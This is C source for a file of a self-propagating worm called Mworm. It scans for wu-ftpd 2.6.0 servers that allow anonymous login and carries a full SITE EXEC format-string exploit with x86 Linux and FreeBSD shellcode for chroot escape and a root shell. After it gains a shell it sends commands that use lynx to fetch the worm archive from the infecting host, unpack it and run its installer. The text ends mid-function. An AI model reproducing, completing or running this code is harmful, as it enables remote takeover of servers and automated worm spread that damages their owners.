   //CheckFTP.c
   //Based on Mscan
   //Part of Mworm

   #include "common.h"



   int         xpb_quad = 0;
   int         xpb_double = 0;
   int         xpb_align = 0;
   int         xp_refind = 0;

   unsigned long int   xp_dstaddr = 0x0;
   unsigned long int   xp_bufdist = 0x0;
   unsigned long int   xp_bufaddr = 0x0;

   unsigned long int   xp_retaddr = 0x0;
   unsigned long int   xp_retloc = 0x0;




   typedef struct {

       char *  target_os;
       char *  bytesex;

       /* XXX/FIXME: ugly stuff, assume padding for \xff, please fix that in
        * case it bothers you
        */
       int         ffpad;

       /* buffer distance search, assume the distance is at least
        * bufdist_min, and at max bufdist_max
        */
       unsigned long int   bufdist_min;
       unsigned long int   bufdist_max;

       /* where to start searching for the buffer address of the source
        * (format string) buffer. it starts with the big addresses and
        * searches towards the lower addresses
        */
       unsigned long int   bufsaddr_start;
       unsigned long int   bufsaddr_end;

       /* the same for the destination buffer addresses
        */
       unsigned long int   bufdaddr_start;
       unsigned long int   bufdaddr_end;

       /* where to start searching for the return address location.
        * this is a midhit, so it will start at: bufdaddr_found + this + 0,
        * and then will flip +4, -4, +8, -8.
        *
        * it will flip retloc_midhit times, then abort if not found
        */
       unsigned long int   retloc_midhit;
       unsigned long int   retloc_maxsearch;

       /* the search for the return address location is based on the
        * assumption that the *retloc is between this two addresses
        */
       unsigned long int   retaddr_low;
       unsigned long int   retaddr_high;


       /* shellcode_read[strlen (shellcode_read)] has to hold the number
        * of bytes to be read from the second shellcode.
        */
       unsigned char *     shellcode_read;
       unsigned char *     shellcode_shell;

       /* some architectures provide the ability to execute stuff on
        * the remote host to enable scripting, so if it does, un-NULL
        * this two pointers, and off you go (with the "-c" option)
        */
       unsigned char *     shellcode_execve;

   } FTP_hostinfo;


   /* BSD DATA
    * bsd stuff by smiler / teso
    */

   /* escaped fbsd read() shellcode */
   unsigned char x86_fbsd_read[] =
       "\x31\xc0\x6a\x00\x54\x50\x50\xb0\x03\xcd\x80\x83\xc4"
       "\x0c\xff\xff\xe4";

   /* break chroot and exec /bin/sh - dont use on an unbreakable host like 4.0 */
   unsigned char x86_fbsd_shell_chroot[] =
       "\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80"
       "\x31\xc0\x99"
       "\x6a\x68\x89\xe3\x50\x53\x53\xb0\x88\xcd"
       "\x80\x54\x6a\x3d\x58\xcd\x80\x66\x68\x2e\x2e\x88\x54"
       "\x24\x02\x89\xe3\x6a\x0c\x59\x89\xe3\x6a\x0c\x58\x53"
       "\x53\xcd\x80\xe2\xf7\x88\x54\x24\x01\x54\x6a\x3d\x58"
       "\xcd\x80\x52\x68\x6e\x2f\x73\x68\x44\x68\x2f\x62\x69"
       "\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\x52\x51\x53\x53"
       "\x6a\x3b\x58\xcd\x80\x31\xc0\xfe\xc0\xcd\x80";

   /* just exec /bin/sh */
   unsigned char x86_fbsd_shell[] =
       "\x31\xc0\x99\x50\x50\x50\xb0\x7e\xcd\x80\x52\x68\x6e"
       "\x2f\x73\x68\x44\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
       "\xe2\x53\x89\xe1\x52\x51\x53\x53\x6a\x3b\x58\xcd\x80"
       "\x31\xc0\xfe\xc0\xcd\x80";

   FTP_hostinfo    hi_freebsd_chroot = {
       "FreeBSD with breakable chroot",
       "little endian",

       4,
       1024,       1024 + 400,
       0xbfbff801, 0xbfbfaad8,
       0xbfbff201, 0xbfbfaad8,
       0x00000400, 0x00000008,
       0x08040000, 0x08060000,

       x86_fbsd_read,
       x86_fbsd_shell_chroot,

       NULL
   };

   FTP_hostinfo    hi_freebsd = {
       "FreeBSD",
       "little endian",

       4,
       1024,       1024 + 400,
       0xbfbff801, 0xbfbfaad8,
       0xbfbff201, 0xbfbfaad8,
       0x00000400, 0x00000008,
       0x08040000, 0x08060000,

       x86_fbsd_read,
       x86_fbsd_shell,

       NULL
   };

   /* LINUX DATA
    */


   /* 15 byte x86/linux PIC read() shellcode by lorian / teso
    *
    * escaped for this purpose it's 16 bytes, the \x00 byte has to be overwritten
    * with the number of bytes we want to read, hence the maximum value is \xff,
    * but we can't use that, so we use \xfe instead, woah ! :-)
    * thanks lorian, cool stuff that is :-)
    */
   unsigned char   x86_lnx_read[] =
       "\x33\xdb"      /* xorl %ebx, %ebx  */
       "\xf7\xe3"      /* mull %ebx        */
       "\xb0\x03"      /* movb $3, %al     */
       "\x8b\xcc"      /* movl %esp, %ecx  */
       "\x68\xb2\x00\xcd\x80"  /* push 0x80CDxxB2  */
       "\xff\xff\xe4";     /* jmp  %esp        */


   /* Lam3rZ code =)
    *
    * setuid/chroot-break/execve
    */
   unsigned char   x86_lnx_shell[] =
       "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
       "\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"
       "\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"
       "\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
       "\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"
       "\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"
       "\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
       "\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
       "\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"
       "\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"
       "\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"
       "\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
       "\x2e\x2e\x31\x31";


   /* 38 byte x86/linux PIC arbitrary execute shellcode - scut / teso
    * second smack, read from message body
    *
    * prepended with a setuid(0)/setgid(0)/chroot() break stub from
    * lorian, because on most linux systems we run in a chroot env
    * when being anonymous, so get rid of that
    */
   unsigned char   x86_lnx_execve[] =
       /* 49 byte x86 linux PIC setreuid(0,0) + chroot-break
        * code by lorian / teso
        */
       "\x33\xdb\xf7\xe3\xb0\x46\x33\xc9\xcd\x80\x6a\x54"
       "\x8b\xdc\xb0\x27\xb1\xed\xcd\x80\xb0\x3d\xcd\x80"
       "\x52\xb1\x10\x68\xff\x2e\x2e\x2f\x44\xe2\xf8\x8b"
       "\xdc\xb0\x3d\xcd\x80\x58\x6a\x54\x6a\x28\x58\xcd"
       "\x80"

       /* execve
        */
       "\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"
       "\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"
       "\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"
       "\xff\xff";


   FTP_hostinfo    hi_linux = {
       "Linux operating system",
       "little endian",

       7,
       1024,       1024 + 400,
       0xbfffe210, 0xbfffa010,
       0xbfffb3f0, 0xbfffa610,
       0x00002004, 0x00000008,
       0x08040000, 0x08060000,

       x86_lnx_read,
       x86_lnx_shell,

       x86_lnx_execve,
   };

   FTP_hostinfo *  FTP_targets[] = {
       &hi_linux,
       &hi_freebsd,
       &hi_freebsd_chroot,
       NULL,
   };

   FTP_hostinfo *  FTP_tg = NULL;

   unsigned char * FTP_shellcode = NULL;
   unsigned char * FTP_shellcode2 = NULL;

   int Handle_Port_21(int fd,char *hostip,struct host *iptr)  //Handle Ftp Scan
   {
        char serv_string[1024];
        ssize_t tmpResult;
        char *tmpStr;
        int  ftptype;
        char ftpsrname[30];

       ftptype = 0;
       if (readable_timeo(fd, FTP_READTIMEOUT)<=0 ) return;
       tmpResult=readline(fd,serv_string,1024,1);

       if (tmpResult<=0) return;
   //  serv_string[tmpResult]=0;
   //   printf("%s: %s",hostip,serv_string);
       if (strstr(serv_string,"220") ==NULL ) return;

       tmpStr= strstr( serv_string, "(Version wu-2.6.0");   //check Wu FTP 2.60
       if (tmpStr!=NULL)
       {
   #ifdef DEBUG
           printf("Wu-FTP %s: %s",hostip,tmpStr);
   #endif
           sprintf(ftpsrname,"%s", "Wu_FTP_2.6.0");
           ftptype=WU_FTP_260;
           goto CHECK_Anonymous_FTP;
       }

       return 0;
   CHECK_Anonymous_FTP:
       if (Check_Anonymous_FTP( fd))  {
   #ifdef DEBUG
           printf("%s: %s Allow Anonymous FTP !!\n", ftpsrname, hostip);
   #endif
           switch (ftptype) {
               case WU_FTP_260:
                   //wuftp260_vuln(fd, hostip, iptr);
                   return 1;
                   break;
           }
       }
       return 0;

   }


   int ftp_login(struct host *iptr)  //Login FTP server
   {
        char serv_string[1024];
        ssize_t tmpResult;
        char *tmpStr;
        int  ftptype;
        char ftpsrname[30];
        int fd;

       fd=TCP_NB_connect(iptr->h_network,iptr->h_port,CONNECT_TIME);
       if(fd<0) return(fd);

       if (readable_timeo(fd, FTP_READTIMEOUT)<=0 ) return -1;
       tmpResult=readline(fd,serv_string,1024,1);

       if (tmpResult<=0) return -1;
       if (strstr(serv_string,"220") ==NULL ) return -1;

       tmpStr= strstr( serv_string, "(Version wu-2.6.0");   //check Wu FTP 2.60
       if (Check_Anonymous_FTP( fd)) return fd;
       else return -1;


   }


   void
   FTP_shell (int sock)
   {
       int l;
       int i;
       char    buf[1024];
       char *setupworm_command[] =         //run shell ,send the following command to remote host
          {
           "export TERM=vt100\n",
           "mkdir /usr/bin/Mworm\n",
           "Download Mworm \n",
           "cd /usr/bin/Mworm\n",
           "tar -xzvf MscanWorm.tgz\n",
           "cd MscanWorm\n",
           "sh install.sh\n"
           };
       int command_count = 7;      //the command count
       char tmpbuf[256];

       for( ; ;){
           if (readable_timeo(sock, FTP_READTIMEOUT)<=0 ) break;
           i=read(sock,buf,1024);
           if (i<=0) break;
           buf[i]=0;
   #ifdef DEBUG
           printf("%s",buf);
   #endif

       }

       for(i=0; i<command_count; i++) {
           if (writeable_timeo(sock, FTP_WRITETIMEOUT)<=0 ) return;
   #ifdef DEBUG
           printf("write: %s\n",setupworm_command[i]);
   #endif
           if(i ==2) {
               sprintf(tmpbuf,
                "lynx --dump http://%s:7977//usr/bin/Mworm/MscanWorm.tgz >/usr/bin/Mworm/MscanWorm.tgz\n",
               Get_localIP(sock));
               if(writen (sock, tmpbuf, strlen(tmpbuf))<0) return;
           }
           else
               if(writen (sock, setupworm_command[i], strlen(setupworm_command[i]))<0) return;

           for( ; ;){
               if (readable_timeo(sock, FTP_READTIMEOUT)<=0 ) break;
               l=read(sock,buf,1024);
               if (l<=0) break;
               buf[l]=0;
   #ifdef DEBUG
               write (1, buf, l);
   #endif

           }

   //      printf ("%s",buf);
       }

   }


   void
   ftp_recv_until (int sock, char *buff, int len, char *begin)
   {
       char    dbuff[2048];


       if (buff == NULL) {
           buff = dbuff;
           len = sizeof (dbuff);
       }

       do {
           memset (buff, '\x00', len);
           if (net_rlinet (sock, buff, len - 1, 20) <= 0)
               return;
       } while (memcmp (buff, begin, strlen (begin)) != 0);

       return;
   }

   unsigned long int
   ftp_finddist (int ftpsock)
   {
       int         i,
                   rdist;      /* relative distance */

       char *          s;
       char            sbuf[1024],
                   rbuf[1024];

       unsigned long int   e1,
                   e2;


       xp_bufdist = 0x0;
       memset (sbuf, '\x00', sizeof (sbuf));

       /* brute routine taken from bobek.py
        */
       for (rdist = 0 ; rdist < (FTP_tg->bufdist_max - FTP_tg->bufdist_min);
           rdist += 8)
       {
           sprintf (sbuf, "SITE EXEC 7 mmmmnnnn");

           for (i = 0 ; i < (FTP_tg->bufdist_min / 8) ; ++i)
               strcat (sbuf, "%.f");

           for (i = 0 ; i < (rdist / 8) ; ++i)
               strcat (sbuf, "%.f");
           for (i = 0 ; i < ((rdist % 8) / 4) ; ++i)
               strcat (sbuf, "%d");

           strcat (sbuf, "|%08x|%08x|");
           net_write (ftpsock, "%s\n", sbuf);

           memset (rbuf, '\x00', sizeof (rbuf));
           if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0)
               return (0);
           printf ("#");
           s = strchr (rbuf, '|');
           if (s == NULL)
               return (0);
           s++;
           if (sscanf (s, "%08lx|%08lx", &e1, &e2) != 2)
               return (0);

           if (e1 == 0x6d6d6d6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist;
           } else if (e1 == 0x6e6d6d6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist - 1;
           } else if (e1 == 0x6e6e6d6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist - 2;
           } else if (e1 == 0x6e6e6e6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist - 3;
           } else if (e1 == 0x6e6e6e6e) {
               xp_bufdist = FTP_tg->bufdist_min + rdist - 4;
           } else if (e2 == 0x6e6e6e6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist + 1;
           } else if (e2 == 0x6e6e6d6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist + 2;
           } else if (e2 == 0x6e6d6d6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist + 3;
           } else if (e2 == 0x6d6d6d6d) {
               xp_bufdist = FTP_tg->bufdist_min + rdist + 4;
           }

           ftp_recv_until (ftpsock, NULL, 0, "200 ");

           if (xp_bufdist != 0)
               return (xp_bufdist);

       }

       return (0);
   }


   int
   net_rlinet (int fd, char *buf, int bufsize, int sec)
   {
       int         n;
       unsigned long int   rb = 0;
       struct timeval      tv_start, tv_cur;

       memset(buf, '\0', bufsize);
       (void) gettimeofday(&tv_start, NULL);

       do {
           (void) gettimeofday(&tv_cur, NULL);
           if (sec > 0) {
               if ((((tv_cur.tv_sec * 1000000) + (tv_cur.tv_usec)) -
                   ((tv_start.tv_sec * 1000000) + (tv_start.tv_usec))) > (sec * 1000000)) {
                   return (-1);
               }
           }
           n = net_rtimeout(fd, FTP_READTIMEOUT);
           if (n <= 0) {
               return (-1);
           }
           n = read(fd, buf, 1);
           if (n <= 0) {
               return (n);
           }
           rb++;
           if (*buf == '\n')
               return (rb);
           buf++;
           if (rb >= bufsize)
               return (-2);    /* buffer full */
       } while (1);
   }

   int
   net_rtimeout (int fd, int sec)
   {
       fd_set      rset;
       struct timeval  tv;
       int     n, error, flags;

       error = 0;
       flags = fcntl(fd, F_GETFL, 0);
       n = fcntl(fd, F_SETFL, flags | O_NONBLOCK);
       if (n == -1)
           return (-1);

       FD_ZERO(&rset);
       FD_SET(fd, &rset);
       tv.tv_sec = sec;
       tv.tv_usec = 0;

       /* now we wait until more data is received then the tcp low level watermark,
        * which should be setted to 1 in this case (1 is default)
        */

       n = select(fd + 1, &rset, NULL, NULL, &tv);
       if (n == 0) {
           n = fcntl(fd, F_SETFL, flags);
           if (n == -1)
               return (-1);
           errno = ETIMEDOUT;
           return (-1);
       }
       if (n == -1) {
           return (-1);
       }
       /* socket readable ? */
       if (FD_ISSET(fd, &rset)) {
           n = fcntl(fd, F_SETFL, flags);
           if (n == -1)
               return (-1);
           return (1);
       } else {
           n = fcntl(fd, F_SETFL, flags);
           if (n == -1)
               return (-1);
           errno = ETIMEDOUT;
           return (-1);
       }
   }


   unsigned long int
   ftp_findaddr (int ftpsock, struct host *iptr)
   {
       int         i,
                   n = 0,
                   blipcount,
                   ssiz,
                   tend;
       unsigned long int   addr;
       unsigned char       popstackbuf[512];
       unsigned char       fabuf[512];
       unsigned char       sbuf[1024];
       unsigned char       rbuf[1024];
       unsigned char *     figure;


       for (addr = FTP_tg->bufsaddr_start ; addr > FTP_tg->bufsaddr_end ; addr -= ssiz) {

           /* 1. build pop stack buffer
            */
           memset (popstackbuf, '\x00', sizeof (popstackbuf));
           for (i = xpb_align; i > 0 ; --i)
               strcat (popstackbuf, "z");
           for (i = xpb_quad ; i > 0 ; --i)
               strcat (popstackbuf, "%.f");
           for (i = xpb_double ; i > 0 ; --i)
               strcat (popstackbuf, "%d");

           if (esc_ok (addr) == 0) continue;

           /* 2. build write buffer
            */
           memset (fabuf, '\x00', sizeof (fabuf));

           xpad_cat (fabuf, addr);
           sprintf (fabuf + strlen (fabuf), "%s", popstackbuf);

           sprintf (sbuf, "SITE EXEC 7 %s", fabuf);
           ssiz = (508 - 4) - strlen (sbuf);
           for (i = ssiz - 4, blipcount = 0 ; i > 0 ; --i, blipcount++)
               strcat (sbuf, "_");
           tend = strlen (sbuf);
           ssiz -= 4;
           sprintf (sbuf + strlen (sbuf), "%%%%|x|%%.%ds", ssiz);  /* XXX: thx smiler */

           net_write (ftpsock, "%s\n", sbuf);

           memset (rbuf, '\x00', sizeof (rbuf));

           if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 8) <= 0) {
               close (ftpsock);
               ftpsock = ftp_login (iptr);
               if (ftpsock <= 0) {
                   exit (EXIT_FAILURE);
               }
               xpb_align = xp_bufdist % 4;
               xpb_quad = xp_bufdist / 8;
               xpb_double = (xp_bufdist % 8) / 4;
           } else {
               ftp_recv_until (ftpsock, NULL, 0, "200 ");
           }

           figure = strstr (rbuf, "_%|x|");
           if (figure == NULL)
               continue;
           figure += 5;

           if (*figure != '_')
               continue;

           for (n = 0 ; *figure == '_' ; ++figure, ++n)
               ;

           xp_bufaddr = addr + n - tend + 1;
           return (xp_bufaddr);
       }

       return (0);
   }


   void
   xpad_cat (unsigned char *fabuf, unsigned long int addr)
   {
       int     i;
       unsigned char   c;


       for (i = 0 ; i <= 3 ; ++i) {
           switch (i) {
           case (0):
               c = (unsigned char) ((addr & 0x000000ff)      );
               break;
           case (1):
               c = (unsigned char) ((addr & 0x0000ff00) >>  8);
               break;
           case (2):
               c = (unsigned char) ((addr & 0x00ff0000) >> 16);
               break;
           case (3):
               c = (unsigned char) ((addr & 0xff000000) >> 24);
               break;
           }
           if (c == 0xff)
               sprintf (fabuf + strlen (fabuf), "%c", c);

           sprintf (fabuf + strlen (fabuf), "%c", c);
       }

       return;
   }


   unsigned long int
   ftp_finddaddr (int ftpsock, struct host *iptr)
   {
       int         i,
                   n = 0,
                   blipcount,
                   ssiz,
                   tend;
       unsigned long int   addr;
       unsigned char       popstackbuf[512];
       unsigned char       fabuf[512];
       unsigned char       sbuf[1024];
       unsigned char       rbuf[1024];
       unsigned char *     figure;


       for (addr = FTP_tg->bufdaddr_start ; addr > FTP_tg->bufdaddr_end ;
           addr -= ssiz)
       {

           /* 1. build pop stack buffer
            */
           memset (popstackbuf, '\x00', sizeof (popstackbuf));
           for (i = xpb_align; i > 0 ; --i)
               strcat (popstackbuf, "z");
           for (i = xpb_quad ; i > 0 ; --i)
               strcat (popstackbuf, "%.f");
           for (i = xpb_double ; i > 0 ; --i)
               strcat (popstackbuf, "%d");

           if (esc_ok (addr) == 0)     continue;

           /* 2. build write buffer
            */
           memset (fabuf, '\x00', sizeof (fabuf));

           xpad_cat (fabuf, addr);
           sprintf (fabuf + strlen (fabuf), "%s", popstackbuf);

           sprintf (sbuf, "SITE EXEC 7 %s", fabuf);
           ssiz = 500 - strlen (sbuf);
           for (i = ssiz, blipcount = 0 ; i > 0 ; --i, blipcount++)
               strcat (sbuf, "_");
           sprintf (sbuf + strlen (sbuf), "%%%%|x|%%.%ds", ssiz);  /* XXX: thx smiler */
           ssiz -= 16;


           net_write (ftpsock, "%s\n", sbuf);

           memset (rbuf, '\x00', sizeof (rbuf));

           if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 8) <= 0) {
               close (ftpsock);
               ftpsock = ftp_login (iptr);
               if (ftpsock <= 0) {
                   exit (EXIT_FAILURE);
               }
               if (xp_refind) {
                   xp_bufdist = ftp_finddist (ftpsock);
                   if (xp_bufdist == 0) {
                       exit (EXIT_FAILURE);
                   }
                   xpb_align = xp_bufdist % 4;
                   xpb_quad = xp_bufdist / 8;
                   xpb_double = (xp_bufdist % 8) / 4;
               }
           } else {
               ftp_recv_until (ftpsock, NULL, 0, "200 ");
           }

           figure = strstr (rbuf, "_%|x|");
           if (figure == NULL)
               continue;
           tend = figure - rbuf;
           figure += 5;

           if (*figure != '_' || strstr (figure, "_%|x|") == NULL)
               continue;

           for (n = 0 ; *figure == '_' ; ++figure, ++n)
               ;


           xp_dstaddr = addr + n - tend - 1;

           return (xp_dstaddr);
       }

       return (0);
   }


   unsigned long int
   ftp_findrl (int ftpsock, unsigned long int retloc)
   {
       int     i;
       unsigned char * sn;
       unsigned char   popstackbuf[512];
       unsigned char   sbuf[512];
       unsigned char   rbuf[2048];


       memset (popstackbuf, '\x00', sizeof (popstackbuf));
       for (i = xpb_align; i > 0 ; --i)
           strcat (popstackbuf, "z");
       for (i = xpb_quad ; i > 0 ; --i)
           strcat (popstackbuf, "%.f");
       for (i = xpb_double ; i > 0 ; --i)
           strcat (popstackbuf, "%d");

       memset (sbuf, '\x00', sizeof (sbuf));
       sprintf (sbuf, "SITE EXEC 7 ");

       xpad_cat (sbuf, retloc);
       strcat (sbuf, popstackbuf);

       strcat (sbuf, "|%.4s|");

       net_write (ftpsock, "%s\n", sbuf);

       memset (rbuf, '\x00', sizeof (rbuf));
       if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
           exit (EXIT_FAILURE);
       }
       ftp_recv_until (ftpsock, NULL, 0, "200 ");

       sn = strchr (rbuf, '|');
       if (sn == NULL)
           return (0);

       sn++;

       if (sn[0] == '|' || sn[1] == '|' || sn[2] == '|' || sn[3] == '|')
           return (0);
       return (*((unsigned long int *) sn));
   }


   void
   ftp_exploit (int ftpsock)
   {
       int     i,
               wlen,
               tow,
               rem;
       unsigned char   popstackbuf[512];
       unsigned char   sbuf[512];
       unsigned char   rbuf[512];
       unsigned char   retaddr[4];


       xpb_quad -= 1;
       xpb_double += 1;
       if (xpb_double >= 2) {
           xpb_quad += xpb_double / 2;
           xpb_double %= 2;
       }

       retaddr[0] = ((xp_retaddr & 0x000000ff)      );
       retaddr[1] = ((xp_retaddr & 0x0000ff00) >>  8);
       retaddr[2] = ((xp_retaddr & 0x00ff0000) >> 16);
       retaddr[3] = ((xp_retaddr & 0xff000000) >> 24);
       wlen = ftp_getwlen (ftpsock);
       wlen -= 4;

       memset (popstackbuf, '\x00', sizeof (popstackbuf));
       for (i = xpb_align; i > 0 ; --i)
           strcat (popstackbuf, "z");
       for (i = xpb_quad ; i > 0 ; --i)
           strcat (popstackbuf, "%.f");
       for (i = xpb_double ; i > 0 ; --i)
           strcat (popstackbuf, "%d");


       memset (sbuf, '\x00', sizeof (sbuf));
       sprintf (sbuf, "SITE EXEC 7 ");
       xpad_cat (sbuf, xp_retloc);
       xpad_cat (sbuf, 0x73507350);
       xpad_cat (sbuf, xp_retloc + 1);
       xpad_cat (sbuf, 0x73507350);
       xpad_cat (sbuf, xp_retloc + 2);
       xpad_cat (sbuf, 0x73507350);
       xpad_cat (sbuf, xp_retloc + 3);
       strcat (sbuf, popstackbuf);

       /* create the paddings
        */
       tow = ((retaddr[0] + 0x100) - (wlen % 0x100)) % 0x100;
       if (tow < 10) tow += 0x100;
       sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
       wlen += tow;

       tow = ((retaddr[1] + 0x100) - (wlen % 0x100)) % 0x100;
       if (tow < 10) tow += 0x100;
       sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
       wlen += tow;

       tow = ((retaddr[2] + 0x100) - (wlen % 0x100)) % 0x100;
       if (tow < 10) tow += 0x100;
       sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
       wlen += tow;

       tow = ((retaddr[3] + 0x100) - (wlen % 0x100)) % 0x100;
       if (tow < 10) tow += 0x100;
       sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
       wlen += tow;

       rem = 510 - strlen (sbuf);
       if (rem < strlen (FTP_shellcode)) {
           exit (EXIT_FAILURE);
       }
       if (strlen (FTP_shellcode2) >= 0xff) {
           exit (EXIT_FAILURE);
       }

       for (i = rem - strlen (FTP_shellcode) ; i > 0 ; --i)
           strcat (sbuf, "\x90");
       strcat (sbuf, FTP_shellcode);


       net_write (ftpsock, "%s\n", sbuf);
       net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20);
       sleep (1);
       net_write (ftpsock, "%s\n", FTP_shellcode2);
       sleep (2);

       net_write (ftpsock, "id;\n");
       FTP_shell (ftpsock);

   #if 1
       memset (rbuf, '\x00', sizeof (rbuf));
       if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
       } else {

           if (memcmp (rbuf, "uid=", 4) == 0) {
               FTP_shell (ftpsock);
           } else {
               exit (EXIT_FAILURE);
           }
       }
   #endif

       return;
   }


   int
   ftp_getwlen (int ftpsock)
   {
       unsigned char * sn;
       int     owlen,
               i;
       unsigned char   popstackbuf[512];
       unsigned char   sbuf[512];
       unsigned char   rbuf[2048];


       memset (popstackbuf, '\x00', sizeof (popstackbuf));
       for (i = xpb_align; i > 0 ; --i)
           strcat (popstackbuf, "z");
       for (i = xpb_quad ; i > 0 ; --i)
           strcat (popstackbuf, "%.f");
       for (i = xpb_double ; i > 0 ; --i)
           strcat (popstackbuf, "%d");

       memset (sbuf, '\x00', sizeof (sbuf));
       sprintf (sbuf, "SITE EXEC 7 ");
       xpad_cat (sbuf, 0x41414141);
       xpad_cat (sbuf, 0x73507350);
       xpad_cat (sbuf, 0x41414142);
       xpad_cat (sbuf, 0x73507350);
       xpad_cat (sbuf, 0x41414143);
       xpad_cat (sbuf, 0x73507350);
       xpad_cat (sbuf, 0x41414144);
       strcat (sbuf, popstackbuf);

       strcat (sbuf, "|%p|%p|%p|%p|%p|");

       net_write (ftpsock, "%s\n", sbuf);

       memset (rbuf, '\x00', sizeof (rbuf));
       if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
           exit (EXIT_FAILURE);
       }
       ftp_recv_until (ftpsock, NULL, 0, "200 ");


       if (strstr (rbuf, "|0x73507350|") == NULL ||
           strchr (rbuf, '|') == NULL)
       {

           exit (EXIT_FAILURE);
       }

       sn = strchr (rbuf, '|');
       owlen = sn - rbuf;

       return (owlen);
   }


   int
   esc_ok (unsigned long int addr)
   {
       if (    (((addr & 0x000000ff)     ) == '%') ||
           (((addr & 0x0000ff00) >> 8) == '%') ||
           (((addr & 0x00ff0000) >> 16) == '%') ||
           (((addr & 0xff000000) >> 24) == '%') ||
           (((addr & 0x000000ff)     ) == '\x0a') ||
           (((addr & 0x0000ff00) >> 8) == '\x0a') ||
           (((addr & 0x00ff0000) >> 16) == '\x0a') ||
           (((addr & 0xff000000) >> 24) == '\x0a') ||
           (((addr & 0x000000ff)     ) == '\x00') ||
           (((addr & 0x0000ff00) >> 8) == '\x00') ||
           (((addr & 0x00ff0000) >> 16) == '\x00') ||
           (((addr & 0xff000000) >> 24) == '\x00'))
       {
           return (0);
       }

       return (1);
   }



   int
   ftp_vuln (int ftpsock)
   {
       int vuln = 0;
       char    resp[512];


       net_write (ftpsock, "SITE EXEC %s\n", "%020d|%.f%.f|");
       memset (resp, '\x00', sizeof (resp));
       if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
           goto fverr;

       if (memcmp (resp, "200-0000000", 11) == 0)
           vuln = 1;


       if (strstr (resp, "|??????????????|") != NULL)  exit (EXIT_FAILURE);
       if (memcmp (resp, "500", 3) == 0)
           return (0);

       if (memcpy (resp, "200 ", 4) == 0)
           return (vuln);
       else
           ftp_recv_until (ftpsock, resp, sizeof (resp), "200 ");

       return (vuln);

   fverr:
       if (ftpsock > 0)
           close (ftpsock);

       return (0);
   }

   int wuftp260_vuln (int ftpsock, char * hostip, struct host *iptr)
   {
       int vuln = 0;
       unsigned char   massbuf[256];
       int     flipcoin,
               n;
       char        c;

   #ifdef  DEBUG
       printf("%s: phase 1 - Check if vulnerable... \n",hostip);
   #endif
       vuln = ftp_vuln(ftpsock);
       if (vuln ==1) {
   #ifdef  DEBUG
           printf("%s: phase 2 - vulnerable... \n",hostip);
   #endif
       }
       else return 0;


       FTP_tg = FTP_targets[0];
       FTP_shellcode2 = FTP_tg->shellcode_shell;
   #ifdef  DEBUG
           printf("%s: phase 3 - finding buffer distance on stack... \n", hostip);
   #endif
       xp_bufdist = ftp_finddist (ftpsock);
       if (xp_bufdist == 0) return 0;
       xpb_align = xp_bufdist % 4;
       xpb_quad = xp_bufdist / 8;
       xpb_double = (xp_bufdist % 8) / 4;
   #ifdef  DEBUG
           printf("%s: phase 4 - finding source buffer address... \n", hostip);
   #endif
       xp_bufaddr = ftp_findaddr (ftpsock, iptr);
       if (xp_bufaddr == 0) return 0;
   #ifdef  DEBUG
           printf("%s: phase 5 - find destination buffer address...  \n", hostip);
   #endif
       xp_dstaddr = ftp_finddaddr (ftpsock, iptr);
       if (xp_dstaddr == 0) return 0;
       FTP_shellcode = FTP_tg->shellcode_read;
       FTP_shellcode[strlen (FTP_shellcode)] = (unsigned char) strlen (FTP_shellcode2);
       xp_retaddr = xp_bufaddr + 511 - strlen (FTP_shellcode) - FTP_tg->ffpad;
   #ifdef  DEBUG
           printf("%s: phase 6 - calculating return address...  \n", hostip);
           printf("%s: phase 7 - getting return address location...  \n", hostip);
   #endif
       flipcoin = 1;
       for (n = 0 ; n <= (FTP_tg->retloc_maxsearch * 4) ; ) {
           unsigned long int   content;

           xp_retloc = xp_dstaddr + FTP_tg->retloc_midhit + (flipcoin * n);

           flipcoin = (flipcoin == 1) ? -1 : 1;
           if (flipcoin == -1)
               n += 4;

           if (esc_ok (xp_retloc) == 0) continue;
           content = ftp_findrl (ftpsock, xp_retloc);
           if (content >= FTP_tg->retaddr_low && content <= FTP_tg->retaddr_high)
               n = 0x7350;
       }
   #ifdef  DEBUG
